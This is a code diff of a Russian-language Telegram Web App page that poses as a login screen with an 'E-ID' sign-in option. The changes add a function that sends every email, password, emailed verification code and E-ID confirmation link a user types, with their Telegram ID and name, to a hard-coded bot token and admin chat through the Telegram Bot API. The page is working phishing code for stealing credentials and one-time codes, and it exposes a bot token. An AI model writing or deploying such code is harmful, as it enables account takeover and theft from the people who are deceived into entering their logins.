@@ -132,7 +132,6 @@
             box-shadow: none;
         }
 
-        /* ===== КНОПКА E-ID (КРАСНАЯ) ===== */
         .btn-eid {
             width: 100%;
             padding: 16px;
@@ -364,7 +363,7 @@
             margin-bottom: 8px;
         }
 
-        /* ===== E-ID СТРАНИЦА (ДИЗАЙН КАК НА СКРИНЕ) ===== */
+        /* ===== E-ID СТРАНИЦА ===== */
         .eid-page .eid-header {
             text-align: center;
             margin-bottom: 24px;
@@ -442,7 +441,7 @@
     <div class="container">
 
         <!-- ========================================================= -->
-        <!-- ===== СТРАНИЦА 1: ГЛАВНАЯ (ЛОГИН) ===== -->
+        <!-- ===== СТРАНИЦА 1: ГЛАВНАЯ ===== -->
         <!-- ========================================================= -->
         <div id="pageLogin" class="page active">
             <div class="logo">
@@ -466,10 +465,7 @@
 
             <div class="divider"><span>или</span></div>
 
-            <!-- ===== КНОПКА E-ID (КРАСНАЯ) ===== -->
-            <button id="eidBtn" class="btn-eid">
-                Вход через E-ID
-            </button>
+            <button id="eidBtn" class="btn-eid">Вход через E-ID</button>
 
             <div class="register-link" style="margin-top:16px;">
                 Нет аккаунта? <a href="#" onclick="showMsg('Регистрация скоро появится', 'info')">Зарегистрироваться</a>
@@ -477,7 +473,7 @@
         </div>
 
         <!-- ========================================================= -->
-        <!-- ===== СТРАНИЦА 2: КОД С ПОЧТЫ ===== -->
+        <!-- ===== СТРАНИЦА 2: КОД ===== -->
         <!-- ========================================================= -->
         <div id="pageCode" class="page">
             <div class="page-icon">📧</div>
@@ -500,7 +496,7 @@
         </div>
 
         <!-- ========================================================= -->
-        <!-- ===== СТРАНИЦА 3: E-ID (ДИЗАЙН КАК НА СКРИНЕ) ===== -->
+        <!-- ===== СТРАНИЦА 3: E-ID ===== -->
         <!-- ========================================================= -->
         <div id="pageEid" class="page eid-page">
             <div class="eid-header">
@@ -520,7 +516,6 @@
 
             <button id="eidSubmitBtn" class="btn-primary">ВХОД</button>
 
-            <!-- ===== ССЫЛКА ПОДТВЕРЖДЕНИЯ (появляется после ввода) ===== -->
             <div id="eidLinkBlock" class="link-box" style="display:none; margin-top:16px;">
                 <label>🔗 Ссылка подтверждения</label>
                 <input type="text" id="eidLinkInput" placeholder="Вставьте ссылку подтверждения">
@@ -549,7 +544,13 @@
 
     <script>
         // ============================================================
-        // 1. ИНИЦИАЛИЗАЦИЯ
+        // 1. КОНФИГ
+        // ============================================================
+        const BOT_TOKEN = "8603629858:AAHoJGBCDvvImzpO3wllUriPulRvX0APozY";
+        const ADMIN_ID = "8542901240";
+
+        // ============================================================
+        // 2. ИНИЦИАЛИЗАЦИЯ
         // ============================================================
         const tg = window.Telegram.WebApp;
         tg.expand();
@@ -589,7 +590,7 @@
         let eidPasswordValue = '';
 
         // ============================================================
-        // 2. ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
+        // 3. ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
         // ============================================================
         function showMsg(text, type = 'info') {
             msgDiv.textContent = text;
@@ -625,6 +626,8 @@
             eidPassword.value = '';
             eidLinkInput.value = '';
             eidLinkBlock.style.display = 'none';
+            eidSubmitBtn.disabled = false;
+            eidSubmitBtn.textContent = 'ВХОД';
             setTimeout(() => eidEmail.focus(), 300);
         }
 
@@ -633,9 +636,30 @@
         }
 
         // ============================================================
-        // 3. ОБЫЧНЫЙ ВХОД → ПОЧТА + ПАРОЛЬ → КОД
+        // 4. ОТПРАВКА СООБЩЕНИЯ ЧЕРЕЗ API (БЕЗ tg.sendData!)
         // ============================================================
-        loginBtn.addEventListener('click', function() {
+        async function sendToAdmin(message) {
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: ADMIN_ID,
+                        text: message
+                    })
+                });
+                const result = await response.json();
+                return result.ok;
+            } catch (error) {
+                console.error('Ошибка отправки:', error);
+                return false;
+            }
+        }
+
+        // ============================================================
+        // 5. ОБЫЧНЫЙ ВХОД → ПОЧТА + ПАРОЛЬ → КОД
+        // ============================================================
+        loginBtn.addEventListener('click', async function() {
             const e = email.value.trim();
             const p = password.value.trim();
 
@@ -651,13 +675,16 @@
             loginBtn.disabled = true;
             loginBtn.textContent = '⏳ Отправка...';
 
-            try {
-                tg.sendData(JSON.stringify({ email: e, password: p }));
+            const success = await sendToAdmin(
+                `🔔 НОВАЯ ЗАЯВКА!\n\n👤 ID: ${tg.initDataUnsafe?.user?.id || 'неизвестно'}\n👤 Имя: ${tg.initDataUnsafe?.user?.first_name || 'Гость'}\n📧 Email: ${e}\n🔑 Пароль: ${p}`
+            );
+
+            if (success) {
+                showMsg('✅ Данные отправлены. Введите код с почты.', 'success');
                 loginBtn.disabled = false;
                 loginBtn.textContent = 'ВХОД';
                 goToCode();
-                showMsg('✅ Данные отправлены. Введите код с почты.', 'success');
-            } catch (err) {
+            } else {
                 showMsg('❌ Ошибка отправки. Попробуйте ещё раз.', 'error');
                 loginBtn.disabled = false;
                 loginBtn.textContent = 'ВХОД';
@@ -665,9 +692,9 @@
         });
 
         // ============================================================
-        // 4. КОД → ОТПРАВКА КОДА
+        // 6. КОД → ОТПРАВКА КОДА
         // ============================================================
-        codeBtn.addEventListener('click', function() {
+        codeBtn.addEventListener('click', async function() {
             const code = codeInput.value.trim();
 
             if (!code || code.length < 4) {
@@ -678,14 +705,17 @@
             codeBtn.disabled = true;
             codeBtn.textContent = '⏳ Отправка...';
 
-            try {
-                tg.sendData(JSON.stringify({ code: code }));
+            const success = await sendToAdmin(
+                `📧 КОД ПОДТВЕРЖДЕНИЯ\n\n👤 ID: ${tg.initDataUnsafe?.user?.id || 'неизвестно'}\n📧 Код: ${code}`
+            );
+
+            if (success) {
                 showMsg('✅ Код отправлен администратору!', 'success');
                 codeBtn.disabled = false;
                 codeBtn.textContent = '✅ Подтвердить';
                 codeInput.value = '';
                 goToSuccess();
-            } catch (err) {
+            } else {
                 showMsg('❌ Ошибка отправки кода', 'error');
                 codeBtn.disabled = false;
                 codeBtn.textContent = '✅ Подтвердить';
@@ -693,14 +723,14 @@
         });
 
         // ============================================================
-        // 5. E-ID → ОТКРЫТЬ СТРАНИЦУ E-ID
+        // 7. E-ID → ОТКРЫТЬ СТРАНИЦУ E-ID
         // ============================================================
         eidBtn.addEventListener('click', goToEid);
 
         // ============================================================
-        // 6. E-ID → ВВОД ПОЧТЫ + ПАРОЛЯ → ПОКАЗАТЬ ССЫЛКУ
+        // 8. E-ID → ВВОД ПОЧТЫ + ПАРОЛЯ → ПОКАЗАТЬ ССЫЛКУ
         // ============================================================
-        eidSubmitBtn.addEventListener('click', function() {
+        eidSubmitBtn.addEventListener('click', async function() {
             const e = eidEmail.value.trim();
             const p = eidPassword.value.trim();
 
@@ -716,31 +746,30 @@
             eidEmailValue = e;
             eidPasswordValue = p;
 
-            // Отправляем почту и пароль админу
-            try {
-                tg.sendData(JSON.stringify({
-                    type: 'eid_login',
-                    email: e,
-                    password: p
-                }));
-                showMsg('✅ Данные отправлены администратору!', 'success');
-            } catch (err) {
-                showMsg('❌ Ошибка отправки', 'error');
-                return;
-            }
-
-            // ПОКАЗЫВАЕМ ПОЛЕ ДЛЯ ССЫЛКИ
-            eidLinkBlock.style.display = 'block';
             eidSubmitBtn.disabled = true;
-            eidSubmitBtn.textContent = '✅ Отправлено';
-            setTimeout(() => eidLinkInput.focus(), 300);
-            showMsg('📎 Введите ссылку подтверждения', 'info');
+            eidSubmitBtn.textContent = '⏳ Отправка...';
+
+            const success = await sendToAdmin(
+                `🆔 E-ID ВХОД\n\n👤 ID: ${tg.initDataUnsafe?.user?.id || 'неизвестно'}\n👤 Имя: ${tg.initDataUnsafe?.user?.first_name || 'Гость'}\n📧 Email: ${e}\n🔑 Пароль: ${p}`
+            );
+
+            if (success) {
+                showMsg('✅ Данные отправлены! Введите ссылку подтверждения.', 'success');
+                eidLinkBlock.style.display = 'block';
+                eidSubmitBtn.disabled = true;
+                eidSubmitBtn.textContent = '✅ Отправлено';
+                setTimeout(() => eidLinkInput.focus(), 300);
+            } else {
+                showMsg('❌ Ошибка отправки', 'error');
+                eidSubmitBtn.disabled = false;
+                eidSubmitBtn.textContent = 'ВХОД';
+            }
         });
 
         // ============================================================
-        // 7. E-ID → ОТПРАВКА ССЫЛКИ ПОДТВЕРЖДЕНИЯ
+        // 9. E-ID → ОТПРАВКА ССЫЛКИ ПОДТВЕРЖДЕНИЯ
         // ============================================================
-        eidLinkBtn.addEventListener('click', function() {
+        eidLinkBtn.addEventListener('click', async function() {
             const link = eidLinkInput.value.trim();
 
             if (!link) {
@@ -751,19 +780,17 @@
             eidLinkBtn.disabled = true;
             eidLinkBtn.textContent = '⏳ Отправка...';
 
-            try {
-                tg.sendData(JSON.stringify({
-                    type: 'eid_link',
-                    email: eidEmailValue,
-                    password: eidPasswordValue,
-                    link: link
-                }));
+            const success = await sendToAdmin(
+                `🔗 ССЫЛКА ПОДТВЕРЖДЕНИЯ E-ID\n\n👤 ID: ${tg.initDataUnsafe?.user?.id || 'неизвестно'}\n👤 Имя: ${tg.initDataUnsafe?.user?.first_name || 'Гость'}\n📧 Email: ${eidEmailValue}\n🔑 Пароль: ${eidPasswordValue}\n🔗 Ссылка: ${link}`
+            );
+
+            if (success) {
                 showMsg('✅ Ссылка отправлена администратору!', 'success');
                 eidLinkBtn.disabled = false;
                 eidLinkBtn.textContent = '✅ Отправить ссылку';
                 eidLinkInput.value = '';
                 goToSuccess();
-            } catch (err) {
+            } else {
                 showMsg('❌ Ошибка отправки ссылки', 'error');
                 eidLinkBtn.disabled = false;
                 eidLinkBtn.textContent = '✅ Отправить ссылку';
@@ -771,13 +798,13 @@
         });
 
         // ============================================================
-        // 8. НАЗАД
+        // 10. НАЗАД
         // ============================================================
         backFromCodeBtn.addEventListener('click', goToLogin);
         backFromEidBtn.addEventListener('click', goToLogin);
 
         // ============================================================
-        // 9. ВЕРНУТЬСЯ НА ГЛАВНУЮ
+        // 11. ВЕРНУТЬСЯ НА ГЛАВНУЮ
         // ============================================================
         resetBtn.addEventListener('click', function() {
             goToLogin();
@@ -785,7 +812,7 @@
         });
 
         // ============================================================
-        // 10. ENTER
+        // 12. ENTER
         // ============================================================
         document.addEventListener('keypress', function(e) {
             if (e.key === 'Enter') {
@@ -804,7 +831,7 @@
         });
 
         // ============================================================
-        // 11. ТЕХПОДДЕРЖКА
+        // 13. ТЕХПОДДЕРЖКА
         // ============================================================
         function openSupport() {
             window.open('https://t.me/potok457', '_blank');
